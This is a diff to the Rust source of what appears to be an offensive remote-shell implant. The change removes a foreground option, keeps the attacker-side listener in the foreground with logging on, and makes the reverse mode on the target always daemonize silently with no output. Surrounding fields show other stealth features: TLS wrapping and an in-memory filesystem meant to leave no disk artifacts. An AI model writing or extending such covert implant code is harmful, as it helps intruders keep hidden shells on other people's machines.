@@ -25,7 +25,6 @@ pub struct Params {
     pub shell: String,
     pub no_shell: bool,
     pub verbose: bool,
-    pub foreground: bool,
     pub tls_wrap: bool,
     pub tls_sni: String,
     pub memfs: bool,
@@ -66,10 +65,6 @@ fn parse_params() -> Result<Params> {
         #[arg(short = 'v', long = "verbose")]
         verbose: bool,
 
-        /// Run listener in foreground (bind mode only, ignored in reverse)
-        #[arg(short = 'f', long = "foreground")]
-        foreground: bool,
-
         /// Use in-memory filesystem for SFTP (no disk artifacts)
         #[arg(long = "memfs")]
         memfs: bool,
@@ -101,7 +96,6 @@ fn parse_params() -> Result<Params> {
         shell: cli.shell,
         no_shell: cli.no_shell,
         verbose: cli.verbose,
-        foreground: cli.foreground,
         tls_wrap: !config::TLS_WRAP.is_empty(),
         tls_sni: config::TLS_SNI.to_string(),
         memfs: cli.memfs || !config::MEMFS.is_empty(),
@@ -129,7 +123,6 @@ fn parse_params() -> Result<Params> {
         shell: config::DEFAULT_SHELL.to_string(),
         no_shell: false,
         verbose: false,
-        foreground: !config::FOREGROUND.is_empty(),
         tls_wrap: !config::TLS_WRAP.is_empty(),
         tls_sni: config::TLS_SNI.to_string(),
         memfs: !config::MEMFS.is_empty(),
@@ -149,16 +142,12 @@ fn main() {
 
     let is_bind = params.listen || params.lhost.is_empty();
 
-    if is_bind && params.foreground {
-        // Bind mode + foreground — no daemonization, output stays on the terminal
+    if is_bind {
+        // Bind/listen mode (attacker side) — always run in foreground
+        // so you can see connections, bind ports, and callback info.
         tokio_main(params);
     } else {
-        // Always daemonize in reverse mode (no output on target).
-        // In bind mode, print a one-line confirmation before backgrounding.
-        if is_bind {
-            eprintln!("neap: listening on :{} (backgrounded, use -f to stay in foreground)", params.lport);
-        }
-
+        // Reverse mode (on target) — always daemonize silently.
         daemon::daemonize();
         tokio_main(params);
     }
@@ -166,8 +155,10 @@ fn main() {
 
 #[tokio::main]
 async fn tokio_main(params: Params) {
-    // Initialise logging: Off by default, Info with -v
-    let level = if params.verbose {
+    // Bind mode: logging on by default (attacker needs to see connections).
+    // Reverse mode: logging off by default (silent on target), -v to enable.
+    let is_bind = params.listen || params.lhost.is_empty();
+    let level = if params.verbose || is_bind {
         log::LevelFilter::Info
     } else {
         log::LevelFilter::Off
